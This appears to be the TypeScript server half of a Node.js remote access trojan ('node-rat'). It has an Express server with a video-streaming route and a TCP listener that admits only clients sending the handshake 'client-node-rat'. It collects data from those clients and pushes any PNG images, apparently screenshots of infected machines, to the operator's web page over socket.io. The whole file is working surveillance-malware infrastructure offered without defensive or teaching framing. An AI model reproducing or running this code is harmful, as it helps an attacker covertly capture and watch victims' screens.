import { createServer } from 'net'
import http from 'http'
import express from 'express'
import path from 'path'
import { Server } from 'socket.io'
import fs from 'fs'
import { fromBuffer } from 'file-type'

const app = express()

app.get('/stream', (req, res) => {
    const { range } = req.headers
    const caminho = path.resolve(__dirname, 'canetaazul.mp4')
    const videoSize = fs.statSync(caminho).size

    if (!range) return console.log('range indefinido')
    const start = parseInt(range.replace(/\D/g, ''))

    const CHUNK_SIZE = 10000
    const end = Math.min(start + CHUNK_SIZE, videoSize - 1)

    const headers = {
        'Content-Range': `bytes ${start}-${end}/${videoSize}`,
        'Content-Type': 'video/mp4',
        'Accept-Ranges': 'bytes'
    }

    res.writeHead(206, headers)

    const videoParts = fs.createReadStream(caminho, { start, end })

    videoParts.pipe(res)
})

app.get('/', (_req, res) => {
    res.sendFile(path.resolve(__dirname, 'src', 'server.html'))
})

const httpServer = http.createServer(app)
const io = new Server(httpServer)
const tcpServer = createServer()

const httpPort = 3000
const portTcp = 8080

httpServer.listen(httpPort)
tcpServer.listen(portTcp)

tcpServer.on('connection', socket => {
    const buf: Buffer[] = []
    let accept = false

    socket.on('data', data => {
        if (!accept) {
            if (data.toString() === 'client-node-rat') {
                accept = true
            } else {
                return socket.end()
            }
        } else {
            buf.push(data)
        }
    })

    socket.on('end', async () => {
        if (!accept) return console.log('Conexão desconhecida detectada')
        const bufConcat = Buffer.concat(buf)
        const type = await fromBuffer(bufConcat)
        // console.log(type?.mime)

        if (type?.mime === 'image/png') {
            io.emit('image', bufConcat.toString('base64'))
        }

        buf.splice(0, buf.length)
    })

    socket.on('close', data => {
        // conexão fechada
    })
})

tcpServer.on('error', err => {
    console.error(err)
})

tcpServer.on('listening', () => {
    console.log('listening')
})

tcpServer.on('close', () => {
    console.log('server closed')
})
